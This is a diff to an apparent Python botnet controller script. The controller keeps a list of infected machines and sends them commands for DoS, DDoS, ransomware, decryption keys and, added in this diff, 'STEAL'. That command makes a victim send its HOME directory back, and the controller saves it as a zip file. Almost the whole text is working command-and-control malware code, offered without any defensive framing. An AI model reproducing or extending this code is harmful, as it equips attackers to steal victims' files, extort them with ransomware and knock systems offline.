@@ -1,11 +1,19 @@
 import socket
 import os
-from threading import Thread
 from messenger import *
+from threading import Thread
 from time import sleep
 
 LISTEN_PORT = 3838
 VICTIM_PORT = 4848
+
+
+def send_steal_attack(payload):
+    infected_ip = str(payload.split(",")[1])
+    print "Beginning to steal %s's HOME directory" % infected_ip
+    msg_contents = "STEAL"
+    Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
+    print "Message Sent"
 
 
 def ransomeware_attack(payload):
@@ -39,7 +47,8 @@ def send_ddos_attack(payload):
     print "DDOS'd attack to ip: %s" % str(target_ip)
 
 
-def add_new_victim(victim_ip):
+def add_new_victim(victim_ip, response):
+    # response contains the JOIN message
     print "Adding %s to our Infected List" % str(victim_ip)
     botnet.append(str(victim_ip))
 
@@ -49,13 +58,19 @@ def list_infected():
         print "Infected: %s" % str(infected)
 
 
+def process_zip_file(victim_ip, file_contents):
+    print "Got the file from %s" % victim_ip
+    with open("Python_received.zip", "w") as f:
+        f.write(str(file_contents[2:]))
+
+
 def listen_for_response():
     s = Messenger.set_up_listening_socket(LISTEN_PORT)
     while True:
-        data, victim = s.recvfrom(8192)
+        data, victim = s.recvfrom(1000000)
         print "Response from IP: %s" % (str(victim[0]))
-        print data
-        command_dict[str(data)](str(victim[0]))
+        msg_type = str(data).split(",")[0]
+        response_dict[msg_type](str(victim[0]), str(data))
     s.close()
 
 
@@ -84,15 +99,20 @@ def main():
 
     listen_thread.join()
 
-
+# NEED TO CHANGE THIS INTO 2 DIFFERENT DICTS
+# COMMAND DICT
+# RESPONSE DICT
 command_dict = {"LIST": list_infected,
-                "JOIN": add_new_victim,
                 "DOS": send_dos_attack,
                 "RANS": ransomeware_attack,
                 "DECRYPT": send_decrypt_key,
                 "DDOS": send_ddos_attack,
+                "STEAL": send_steal_attack,
                 "EXIT": quit_all
                 }
+response_dict = {"JOIN": add_new_victim,
+                 "D": process_zip_file
+                 }
 
 if __name__ == '__main__':
     main()
